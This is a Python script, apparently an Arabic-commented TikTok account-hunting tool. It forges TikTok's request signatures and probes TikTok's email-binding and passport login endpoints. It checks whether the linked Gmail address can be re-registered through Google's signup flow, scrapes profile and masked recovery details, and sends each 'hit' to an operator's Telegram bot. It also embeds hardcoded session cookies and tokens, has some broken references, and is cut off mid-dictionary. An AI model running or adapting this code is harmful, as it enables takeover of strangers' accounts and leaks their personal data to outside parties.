#Code Write : @jokerpython3
import os
try:
    import requests
    import uuid
    import time
    import secrets
    import binascii
    from user_agent import generate_user_agent as nn
    import random,re
    from MedoSigner import Argus, Gorgon, md5, Ladon
    from urllib.parse import urlencode
    from types import coroutine
    import threading
    from concurrent.futures import ThreadPoolExecutor
except:
    os.system("pip install requests")
    os.system("pip install uuid")
    os.system("pip install user_agent")
    os.system("pip install MedoSigner")
    os.system("pip install pycryptodome")
    os.system("pip install types")
os.system("clear")
#-------------[]-------------        
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
S = '\033[2;36m'#سمائي
G = '\033[1;34m' #ازرق فاتح
HH='\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
#-------------[]------------
class S1:
  def __init__(self):
    self.t=0
    self.f=0
    self.tf=0
    self.abc='azertyuiopmlkjhgfdsqwxcvbn'
    self.ses=requests.Session()
    self.name =''.join(random.choice(self.abc) for i in range(random.randrange(5,10)))
    self.birthday = random.randrange(1980,2010),random.randrange(1,12),random.randrange(1,28)
    self.a = 'qwertyuiopasdfghjklzxcvbnm'
    
    self.tok=input(f"{HH} Token: {M}")
    self.id=input(f"{HH} ID: {M}")
    self.sey=[]
    self.num=int(input(f"{HH} Enter Number Session Do You Have Tik : {M}"))
    for ss in range(self.num):
        qa=input(f"{HH} {ss+1} Enter Session TikTok : {M}")
        self.sey.append(qa)
 


    	
    

      
    os.system("clear")
    for _ in range(5):
      threading.Thread(target=self.se).start()
  def re(self,email):
      def sign(params, payload: str = None, sec_device_id: str = "", cookie: str = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
          x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
          if not unix:
              unix = int(time.time())
          return Gorgon(params, unix, payload, cookie).get_value() | {
              "x-ladon": Ladon.encrypt(unix, license_id, aid),
              "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id, sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version)
          }

      try:
          secret = secrets.token_hex(16)
          session = requests.Session()
          session.cookies.update({"passport_csrf_token": secret, "passport_csrf_token_default": secret})

          url = "https://api22-normal-c-alisg.tiktokv.com/passport/account_lookup/email/"
          params = {
              'request_tag_from': "h5",
              'fixed_mix_mode': "1",
              'mix_mode': "1",
              'account_param': user,
              'scene': "5",
              'device_platform': "android",
              'os': "android",
              'ssmix': "a",
              '_rticket': str(round(time.time() * 1000)),
              'cdid': str(uuid.uuid4()),
              'channel': "googleplay",
              'aid': "1233",
              'app_name': "musical_ly",
              'version_code': "370104",
              'version_name': "37.1.4",
              'manifest_version_code': "2023701040",
              'update_version_code': "2023701040",
              'ab_version': "37.1.4",
              'resolution': "720*1448",
              'dpi': "320",
              'device_type': "RMX3269",
              'device_brand': "realme",
              'language': "ar",
              'os_api': "30",
              'os_version': "11",
              'ac': "wifi",
              'is_pad': "0",
              'current_region': "IQ",
              'app_type': "normal",
              'sys_region': "IQ",
              'last_install_time': str(int(time.time())),
              'mcc_mnc': "41840",
              'timezone_name': "Asia/Baghdad",
              'carrier_region_v2': "418",
              'residence': "IQ",
              'app_language': "ar",
              'carrier_region': "IQ",
              'timezone_offset': "10800",
              'host_abi': "arm64-v8a",
              'locale': "ar",
              'ac2': "wifi",
              'uoo': "0",
              'op_region': "IQ",
              'build_number': "37.1.4",
              'region': "IQ",
              'ts': str(int(time.time())),
              'iid': str(random.randint(1, 10**19)),
              'device_id': str(random.randint(1, 10**19)),
              'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
              'support_webview': "1",
              'cronet_version': "f6248591_2024-09-11",
              'ttnet_version': "4.2.195.9-tiktok",
              'use_store_region_cookie': "1"
          }

          x_args = sign(params=urlencode(params), payload="", cookie="")
          headers = {
              'User-Agent': "com.zhiliaoapp.musically/2023701040 (Linux; U; Android 11; ar_IQ; RMX3269; Build/RP1A.201005.001; Cronet/TTNetVersion:f6248591 2024-09-11 QuicVersion:182d68c8 2024-05-28)",
              'Accept': "application/json, text/plain, */*",
              'x-tt-passport-csrf-token': secret,
              'content-type': "application/x-www-form-urlencoded",
              'x-argus': x_args["x-argus"],
              'x-gorgon': x_args["x-gorgon"],
              'x-khronos': x_args["x-khronos"],
              'x-ladon': x_args["x-ladon"]
          }

          response = session.post(url, params=params, headers=headers)
          response.raise_for_status()

          passport_ticket = response.json()["data"]["accounts"][0]["passport_ticket"]

          login_url = "https://api22-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"
          params.update({"passport_ticket": passport_ticket})

          for key in ['mix_mode', 'account_param', 'fixed_mix_mode']:
              params.pop(key, None)

          response = session.post(login_url, params=params, headers=headers)
          response.raise_for_status()

          hh = json.loads(response.headers.get("x-tt-verify-idv-decision-conf", "{}"))
          result = {'number': '', 'email': ''}

          for entry in hh.get('extra', []):
              if '+' in entry['masked_account']:
                  result['number'] = entry['masked_account']
              elif '@' in entry['masked_account']:
                  result['email'] = entry['masked_account']

          return result

      except Exception as e:
          print(f"Error occurred: {e}")
          return {'number': '', 'email': ''}
  def info(self,email):
    user=email.split('@')[0]
    try:
      he={'User-Agent':str(nn())}
      ti= requests.get(f'https://www.tiktok.com/@{user}', headers=he).text
      info = str(ti.split('webapp.user-detail"')[1]).split('"RecommendUserList"')[0]
      country = str(info.split('region":"')[1]).split('",')[0]
      like = str(info.split('heart":')[1]).split(',"')[0]
      name = str(info.split('nickname":"')[1]).split('",')[0]
      followers = str(info.split('followerCount":')[1]).split(',"')[0]
      following = str(info.split('followingCount":')[1]).split(',"')[0]
      video = str(info.split('videoCount":')[1]).split(',"')[0]
      id = str(info.split('id":"')[1]).split('",')[0]
      private = str(info.split('privateAccount":')[1]).split(',"')[0]
      rest=self.re(email)
      #لاتخمط
      ff = f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
By: @jokerpython3
═══════════════════
𝙽𝙰𝙼𝙴 : {name}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {user}@gmail.com
Rest : {rest}
Likes : {like}
Country : {country}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {followers}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
𝙸𝙳 : {id}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {private}
𝚅𝙴𝙳𝙾 : {video}
═══════════════════
        '''	
      print(ff)        
      requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + str(ff))
      with open('Hit.txt','a') as x:
        x.write(ff)
    except:
      ff = f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
By: @jokerpython3
═══════════════════
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {user}@gmail.com
Rest : {rest}
═══════════════════
        '''				
      requests.post(f"https://api.telegram.org/bot{self.tok}/sendMessage?chat_id={self.id}&text=" + str(ff))
      with open('Hit.txt','a') as x:
              x.write(ff)



  def ch1(self,email):
      headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',

            'origin': 'https://accounts.google.com',
            'referer': 'https://accounts.google.com/',

            'user-agent':str(nn()),

            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["S453210854:1738875354740240"]',
            'x-same-domain': '1',
        }
      params = {
            'biz': 'false',
            'continue': 'https://www.google.com/search?q=odiid&oq=odiid&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBBzUzOGowajGoAgCwAgA&sourceid=chrome-mobile&ie=UTF-8',
            'ec': 'GAlAAQ',
            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'hl': 'ar',
            'authuser':'0',



      }
      response = self.ses.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
      TL = response.url.split('TL=')[1]
      at = str(response.text).split('"SNlM0e":"')[1].split('"')[0].replace(':', '%3A')
      s1 = str(response.text).split('"Qzxixc":"')[1].split('"')[0]
      headers.update({'x-goog-ext-391502476-jspb': '["{}"]'.format(s1)})
      params = {
            'rpcids': 'MjyMj',
            'source-path': '/lifecycle/steps/signup/name',

            'hl': 'ar',
            'TL': TL,

            'rt': 'c',
        }
      data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.name,at)
      response =self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        ).text
      params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',

            'hl': 'ar',
            'TL':TL,

            'rt': 'c',
        }
      data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C1%2Cnull%2Cnull%2Cnull%2C%5C%22%3CoW1qbTUCAAYBzfNKIc2NqatmouWwTSP0ADQBEArZ1I8Ch94lfpYfrmnrKHwxJnKWaKN7vmaPg1nZckhu9cYTqaaLl9zl8ICQiMB8gh4rzQAABFmdAAAAJKcBB7EATQJA4FY8cFsp8MFfaz9q6AFO6Kzn-UhxhRTzfpl6KopMZy7G5tgtsVkZP4YbDJNN7rRAJVymInyeE5vDep-2fJKhZpjLnIOO6vaqoMXVVgi20M5Hqs8IpKTOnpX_Yucia2MQu9wzUcQ4rGkBbHbNiXEbB_QSLbcN23KbhIEZLn2OKMQyIOGkthlWltVHbzk3qiZNVE7gTSFhzJHD-S0lhNKktIsSNwBWGOnSbWF0PskCKIWdcKVqR0aHRR5AmXY8ltz408DI3GBrI11_AVadMRaXzD7K9bgJIInK4UhXDlOUY2GOS0dt0A_ZcwNJsZy61_7ATmWbi5O8FZ-pCgBsfEiVjTbMeTeVKQ-AgYLnFF1Ii0WH_Y-JpJpGVT5BsziPX-bMUFVdVa4eMcCGcorkwMkvgmfQolD3guqTAQdihtw0VbBHNFxlkmHuNa1zQHZVvh0efFlfhnrX8YHceq_mh5zVS4O3eUAExyabrFQW2NJDvr0VfFHN0c64C3JAgAuC2JujAim7IV9t3oHNvquEQE1yWYQzyS8Co54nc_CbPcMF5iHN7cZiiUXFLvjdNedJzZ9IHESmt6acC4W4ralK6NbSg4qk3HXsKQe9J1bvQ0pFzlZK8q0EEXPFINP7xioq6V0jeGU9qGmdktBdMWIanTDzu6kIecW5sQEMYx8Bo86G8j8d88xb3DVzeTtjTpOJ1TDAvoMfj0iKP6PBDA2dw1ta4LQPZWJFUwP1_BIl6SjXNDlbCcENDiIvH9H0hvS1l7EhbvJqo9iducM8cnr0z47rVEcmNW1JriRaa2QnjqN6cMD8gLqroivmX2LTSl6iTdhL4YZMKTDbL7nAAuGbhxj2IqyeNwlHeO62KWxrAYtBKMq2-bNBsWns1ZMo9zrrYM4if30mVaSeEoPzkkfq28OuvH35JbT9RzTAO4Tb_HI7l-5AvA-Du5I-dVfBmCUcXek_2R4CUcIkQJkh1V5x6o4kLDjymG3YkUDzuMVeGFUlL8C8zPVmya1WV5FKbV_2XjfKCvNKoqMXGrEezTIoKJ_0_PwNGRkIcAckLkhKyzHiAOxSSYTV7_9GwWI3kct2ifRjGs5MRCfK0FgdafCQuDtmr_njqS0wj4qqLW_2PfKyHKCLaMTZMMShcXMG4X0_5898av9tI4HXYb8OAegshjnS42GJ41_vLNDmb_HS_lEEUPT2pmujipjE4rLCyooQHLI_XR9B6yb9gkB0Co44fGqDXPBxr6LyVyZlnGbEicqbpERhIFG_9GjsjQVZfquJuNQ_ds7w6G3YL4XLxmjsWWkipQXmLRF-E8YimF9M1OUNKzqUeq149TCEMLLDDRrF4-k7866Xy1L7xjDjE-3QS-nGzHbK8wOgIu3v-4fldiumMm26FJRuk9WuTeYG7xXeQSyg0p0oYrDq2KlH4YAwUZL7d6z8-mN22IFpaK6H9wGLZzcBTaHtkrSfyLLEv3aRgvg2p1zyzmu1Ybkw3OwBJyBZgHCmrVim3f_Cvxn4w2deq-9YA0ok_x3_nzrEi8khS4RM6enmJLFc2yLWTk3Dmb4He2cyyjaOoypcTywMXp9ZBd01vUB6QaQ4THa2uS3C5N5yiyJBermtbU17daoFg8OJHKkGiEq59_WnPoTXa2c-WOrEmT27GCn2aFt4UPWUHID6ZqUd9iMGaz6NhFtVp-qFyUY8ejpyaqgaMYD9jguM0NlgauZv6LloS54HtLoqgEMTGiQDwfqFvcbTcFmf_O2LPKYvNOj4fUAkBbth8MzHBUeDQEMjm-9noSQGq8LG3cJN5L9a2rhC36zsYo2Uo3jexXOfgZOBHHOfxSbWKgSVGL9dEvEHwsyf2sSJxUIcAAp6ECVaWqEY1pdaaNLefKJ2DO-AYj4E31aN3ftlP0UF_0ydLl7EMDxYSDp8xNq2KCjAC9Q6vBf6o4rBRZwKSXYKwluyNDT_ZhDowhq-tHMDSxB4eDbaFnA1q6B2vvAKNYJU3heQ4KRwrKZ6fUwUfyymQ2wjdeVXDOCiNk56dSvJNVEMToNlcCTHInl9XG1QfZusRflcibYKYnrtqklEZVEpv74y5h2JypKKiXsRo_bQj-UBnSFWKY4U50EzDLRyNRlrP5B68WpV5aSAwxzMR_wsIaHhAWQNorE1n5FIOuSD0I0laAmSw7KbESwYfebw9MPTdGXZH7o9wMnJzFKOUG0h1XVMD-loA-X99dkqMAK1oMUFXIo3J2cLm8AjA116lFdfrIJ8zBrOxXO188nowci8AbJRrcJzgkC29t5e7_Q5xRXknPdrOO-W7tSySsgdRlLVQLP4Sw_ChmlPGTpGG9FzCAqpMowBi8sjjXdZGL0jVQ5KOTZT0XsfF1LBe6EwvoFfjB1LArKqmXKykG6UbFW0F6s692TvkhmEzeK2HL9seyZ8L8THugqYmKHywBdVzvdRGri8blQUk1tWQG9imNMkfE7qcvZtViMJbe1-b94ZIwbnEv4iGd1oYEqL4F5xzMPg_LOftp8paGHq0XhSCibleGbdTw-Hf-NEXTDZE4TWV1UHpKCksoqgTtZs0wd11awf8qAruyPf4pf8VQgU1phyDzHEQbXlMwU3K4iCgCd4w-FuhisNwrW-5wdGl1WrH_Qw6VAvOkoAYPkgjKq_NiKknSW2WrsJtzPsq2Y_OrNM4rdxvrhveZGztQIn6QgBZBym4kfgNkmOmym7KibdZBCqHs8wqrRv9LYG9AowtvBhyWlGTf6OLvRO66Nct8rkdHYBIubxKRVIyAx2LtUwHKtsheX32-MGDyTuD0C1Evh3yeWN5RQGfw2hUyZq9U0mUbLn_LJX_w6fxRBDk6-FjsLTfgFV-listZpVbw4eyJt2KJDSAynICBlmF4vXu-VY9gWgmq4oFPHZfQP9HN5Cegn9R8aK353Y2pKGhDUcDRhLfwMHOAVzGbnjzgMwfsMeK40tgBDE2PkwuuACp_FuJy3EDEJf5pfiA38O0CuLz2AiXeRztWEkuCVNcwTH7QMRsJcI28SuZNwl0uQx2_yNboa9TWb-DSv3CfEr9AKSU7Fy0pVmjzMEBzbiHib2tuw0HzX9dE03Tg%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dodiid%26oq%3Dodiid%26gs_lcrp%3DEgZjaHJvbWUyBggAEEUYOdIBBzUzOGowajGoAgCwAgA%26sourceid%3Dchrome-mobile%26ie%3DUTF-8%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(self.birthday[0],self.birthday[1],self.birthday[2],at)
      fr = self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        ).text
      params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',

            'hl': 'ar',
            'TL':TL,
            'rt': 'c',
        }
      if "@" in email:
          em=email.split("@")[0]
      data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C0%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C13922%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(em,at)
      rse =self.ses.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        ).text

      if "password" in rse:
          self.info(email)
          self.t+=1
          os.system('cls'if os.name=='nt'else'clear')
          lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
          print(lo)		  
      elif '400' in rse or '401'  in rse:
      	self.ch1(email)       
      else:
              
              self.tf+=1
              os.system('cls'if os.name=='nt'else'clear')
              lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
              print(lo)		         			         	
		         	

   					        



  def ch2(self,email):



      def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
          x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload else None
          data = payload
          if not unix:
              unix = int(time.time())
          return Gorgon(params, unix, payload, cookie).get_value() | {
              "x-ladon": Ladon.encrypt(unix, license_id, aid),
              "x-argus": Argus.get_sign(
                  params, x_ss_stub, unix, platform=platform, aid=aid, license_id=license_id,
                  sec_device_id=sec_device_id, sdk_version=sdk_version_str, sdk_version_int=sdk_version
              )
          }


      encrypted = [hex(ord(c) ^ 5)[2:] for c in email]
      em = "".join(encrypted)

      session = requests.Session()
      sestik=random.choice(self.sey)
      secret = secrets.token_hex(16)
      cookies = {
          "passport_csrf_token": secret,
          "passport_csrf_token_default": secret,
          "sessionid": sestik,
      }
      
      session.cookies.update(cookies)


      device_brands = ["samsung", "huawei", "xiaomi", "apple", "oneplus"]
      device_types = ["SM-S928B", "P40", "Mi 11", "iPhone12,1", "OnePlus9"]
      regions = ["AE", "IQ", "US", "FR", "DE"]
      languages = ["ar", "en", "fr", "de"]

      params = {
          'passport-sdk-version': "6031490",
          'device_platform': "android",
          'os': "android",
          'ssmix': "a",
          '_rticket': str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
          'cdid': str(uuid.uuid4()),
          'channel': "googleplay",
          'aid': "1233",
          'app_name': "musical_ly",
          'version_code': "370104",
          'version_name': "37.1.4",
          'manifest_version_code': "2023701040",
          'update_version_code': "2023701040",
          'ab_version': "37.1.4",
          'resolution': "720*1448",
          'dpi': str(random.choice([420, 480, 532])),
          'device_type': random.choice(device_types),
          'device_brand': random.choice(device_brands),
          'language': random.choice(languages),
          'os_api': str(random.randint(28, 34)),
          'os_version': str(random.randint(10, 14)),
          'ac': "wifi",
          'is_pad': "0",
          'current_region': random.choice(regions),
          'app_type': "normal",
          'sys_region': random.choice(regions),
          'last_install_time': str(random.randint(1600000000, 1700000000)),
          'mcc_mnc': "41840",
          'timezone_name': "Asia/Baghdad",
          'carrier_region_v2': "418",
          'residence': random.choice(regions),
          'app_language': random.choice(languages),
          'carrier_region': random.choice(regions),
          'timezone_offset': str(random.randint(0, 14400)),
          'host_abi': "arm64-v8a",
          'locale': random.choice(languages),
          'ac2': "wifi",
          'uoo': "0",
          'op_region': random.choice(regions),
          'build_number': "37.1.4",
          'region': random.choice(regions),
          'ts': str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
          'iid': str(random.randint(1, 10**19)),
          'device_id': str(random.randint(1, 10**19)),
          'openudid': str(binascii.hexlify(os.urandom(8)).decode()),
          'support_webview': "1",
          'reg_store_region': random.choice(regions).lower(),
          'user_selected_region': "0",
          'cronet_version': "f6248591_2024-09-11",
          'ttnet_version': "4.2.195.9-tiktok",
          'use_store_region_cookie': "1"
      }


      payload = {
        'email': email,
    }

      app_name = "com.zhiliaoapp.musically"
      app_version = f"{random.randint(2000000000, 3000000000)}"
      platform = "Linux"
      os_version = f"Android {random.randint(10, 15)}"
      locales = ["ar_AE", "en_US", "fr_FR", "es_ES"]
      locale = random.choice(locales)
      device_type = random.choice(["phone", "tablet", "tv"])
      build = f"UP1A.{random.randint(200000000, 300000000)}"
      cronet_version = f"{random.randint(10000000, 20000000)}"
      cronet_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"
      quic_version = f"{random.randint(10000000, 20000000)}"
      quic_date = f"{random.randint(2023, 2025)}-{random.randint(1, 12):02}-{random.randint(1, 28):02}"

      user_agent = (f"{app_name}/{app_version} ({platform}; U; {os_version}; {locale}; {device_type}; "
                    f"Build/{build}; Cronet/{cronet_version} {cronet_date}; "
                    f"QuicVersion:{quic_version} {quic_date})")


      x_args = sign(params=urlencode(params), payload="", cookie="")

      headers = {
          'User-Agent': user_agent,
          'x-tt-passport-csrf-token': secret,
          'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
          'x-argus': x_args["x-argus"],
          'x-gorgon': x_args["x-gorgon"],
          'x-khronos': x_args["x-khronos"],
          'x-ladon': x_args["x-ladon"],
      }

      url ="https://api22-normal-c-alisg.tiktokv.com/passport/email/bind_without_verify/"

      rei = session.post(url, params=params, data=payload, headers=headers).text
      print(rei)
      if '1023' in rei:
          self.ch1(email)
          os.system('cls'if os.name=='nt'else'clear')
          lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
          print(lo)
  


      else:
        self.f+=1
        os.system('cls'if os.name=='nt'else'clear')
        lo=f'''
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━  
{F}[ ● ] 𝗛𝗜𝗧 ● {self.t}  
{Z}[ ● ] 𝗙𝗔𝗟𝗦𝗘 𝗧𝗜𝗞 ● {self.f}  
{X}[ ● ] 𝗕𝗔𝗗 𝗚𝗠𝗔𝗜𝗟 ● {self.tf}  
{A}[ ● ] 𝗘𝗺𝗮𝗶𝗹 ● {email}  
{M}━━━━━━━━━━━●━━━━━━━━━━━●━━━━━━━━━
'''
        print(lo)	    	




  def se(self):
      while True:
          try:

              k= random.choice(
      [
              'دجحخهعغفقثصضشسيبلاتنمكطظزوةيارؤءئ',  
              '1234567890azertyuiopmlkjhgfdsqwxcvbn',  
              'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン',
              'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん',
              'ABCÇDEFGĞHIİJKLMNOÖPRSŞTÜVYZ',  
              'АБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ',  
              'अआइईउऊऋएऐओऔकखगघङचछजझञटठडढणतथदधनपफबभमयरलवशषसहक्षत्रज्ञ',  
              'ابپتثجچحخدذرزژسشصضطظعغفقکگلمنوهی'
      ]
  )
              j = ''.join(random.choice(k) for i in range(random.randrange(4, 9)))
              i = "".join(random.choice('1234567890') for i in range(19))
              headers = {"User-Agent": f'com.zhiliaoapp.musically/{j} (Linux; U; Android {random.randrange(7,13)}; en_IQ_#u-nu-letn; ANY-LX1; Build/{j}; Cronet/58.0.{random.randrange(3,9)}.0)'}
              t=requests.get('https://www.tiktok.com/',headers=headers).cookies.get_dict()
              tt=t["ttwid"]


              se=str(uuid.uuid4()).replace('-','')
              cookies = {
      'tt_chain_token': 'JrtxBwKrYDi1P1O2diqOhA==',
      'passport_csrf_token': '246019ac646b14e6d25cf6391b8862a8',
      'passport_csrf_token_default': '246019ac646b14e6d25cf6391b8862a8',
      'msToken': 'PowIaI0fvFjfsxA_0r-kuGWMqB_rm9_4fV1XfzEPnBzCv1cc0l4MRy7wWso6YxnkMD04WDLRmU87SAIlwCcLph5Ix4JZjjnvCgUBSwTbboMX7GAT5sJz2QNyTjw=',
      'd_ticket': 'ebbf13e71e66b5d68782e71a646920750fc22',
      'multi_sids': '7339266198948037633%3A78bd0b37de7c9596b03ee4ff207ac6c9',
      'cmpl_token': 'AgQQAPO_F-RO0rXkoR6EZp04_VbEDeUTP7UsYNv7RQ',
      'sid_guard': '78bd0b37de7c9596b03ee4ff207ac6c9%7C1731681679%7C15552000%7CWed%2C+14-May-2025+14%3A41%3A19+GMT',
      'uid_tt': str(se[:16]),
      'uid_tt_ss': str(se[:16]),
      'sid_tt': str(se),
      'sessionid': str(se),
      'sessionid_ss': str(se),
      'sid_ucp_v1': '1.0.0-KDNiYTY1NjgwYzI2NjRiN2NjZjE3N2M0MzEyZmEzYmIzM2IxMzA0YTEKIgiBiNHikPeT7WUQj7vduQYYswsgDDDun-muBjgBQOoHSAQQAxoGbWFsaXZhIiA3OGJkMGIzN2RlN2M5NTk2YjAzZWU0ZmYyMDdhYzZjOQ',
      'ssid_ucp_v1': '1.0.0-KDNiYTY1NjgwYzI2NjRiN2NjZjE3N2M0MzEyZmEzYmIzM2IxMzA0YTEKIgiBiNHikPeT7WUQj7vduQYYswsgDDDun-muBjgBQOoHSAQQAxoGbWFsaXZhIiA3OGJkMGIzN2RlN2M5NTk2YjAzZWU0ZmYyMDdhYzZjOQ',
      'store-idc': 'alisg',
      'store-country-code': 'sa',
      'store-country-code-src': 'uid',
      'tt-target-idc': 'alisg',
      'tt-target-idc-sign': 'XZmtyx-eMB071s61R-ipkSuBlb1gHWP_2ILLs_mwmzXmgduMteLOhESnOyQN3e7IiPxJUl_HaZVpmHpz7-pdUaYTEgy9GkvVen1WpMtvLsoxtTDlSYtwhKdZH5WfUhKdkfsLC2cMDQQCPuzy2n8ZTAp86XqHlOvuT6HlDnL6Afzog_hIpYAX9JcCmSY5Kdzy23i1xUY8Hm9YfqbCE08MhIcTaqs_2J7uHo6NOUjyjUbSZoHHbra7myQ1jpM8B-QexARXshznh_e20yxUQg5iwcdwbRceU6eIV_upaja9p7k4fCzjAUMDigRL171k6irRP00ZkA7vicBpBT4smdVNFkouNDS-5Nz-KkPFyWWHCu4vQbZgO8ERLE1nB1SIHUrufZsk-LnLCSesrF8G40tF7_nM_ihsbG_bpdVAObLxpisyEy2GV6ZvJAlEQjQeMfb5vtRMwuFwTEXmwuB7JgGpipgj4NcMi2IBVbCFAQRFrZy4jpOkMzQIsmee71O_0jIN',
      'last_login_method': 'email',
      'delay_guest_mode_vid': '5',
      'tiktok_webapp_theme_source': 'system',
      'tiktok_webapp_theme': 'dark',
      'ak_bmsc': '0F9BB0D9E44BABE780D553F1AFD87B00~000000000000000000000000000000~YAAQYHkQAhG+bC+UAQAA0b6LNxoOZPTwXxOyu2eS2/z3pSLTlR93RCpW9VP+Z3KVXu9ffzAr6vfd15ERZxI8q+T/a0/QZXh4ClSyY5m3wwadEzoIhW/CW7cFv602H+qYtOC5r1YQQbUX6odyYpfn/Ra/nQeTzjVHT1D+vx/AiElRyEfsPeabg+nVF+byLj2asmc9tBUHYvq0P4DOrVK/Y/fiyLIyEagVYQvLLCFwa0WMPzFO7xJLPf3iMLoLV0dsun/rUDS/FBhsYJLXPVaKN5FBlCdAnq3SQ8mckI9F95E0KVDwKoF7+QpMTiaqzgLIbriNcqCUZPOI9+cpXHKu3s3U1GDG8FnnwjUGpsaa1coczaarbolmhRmW3OMYMO7hIZigktKbdqgJE7+l/LRmxnC8qavSTti/7y8=',
      'tt_csrf_token': '2A6X0kRJ-Ojgn0FbcobxF1-FATwZUYiHv6KA',
      'passport_fe_beating_status': 'true',
      'ttwid': tt,
      'odin_tt': 'a40d52507c3b11f9f8a4f7a9214cb3af7fe9e891533cfbb6b736bc5811028118edec52ee5634169f2daf866cd8daba57a5fcfa51be083e68fcdafe826a3e843b4476bae9384207847e45cbd50707d18f',
